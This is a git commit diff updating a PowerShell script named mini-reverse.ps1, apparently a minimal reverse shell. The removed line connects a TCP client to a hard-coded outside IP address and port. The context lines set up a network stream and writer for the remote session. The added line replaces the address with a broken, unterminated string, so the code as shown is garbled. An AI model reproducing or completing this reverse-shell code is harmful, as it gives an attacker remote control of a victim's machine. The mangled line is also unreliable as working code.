7b884707915a58b7b2df371d4f6ed448e9568a77
fengge332 <140494841+fengge332@users.noreply.github.com>
2023-09-04 18:13:58 +0800

    Update mini-reverse.ps1

--- mini-reverse.ps1
+++ mini-reverse.ps1
@@ -1,4 +1,4 @@
-$socket = new-object System.Net.Sockets.TcpClient('152.32.187.141', 8888);
+$socket = new-object System.Net.Sockets.TcpClient('ssssss
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
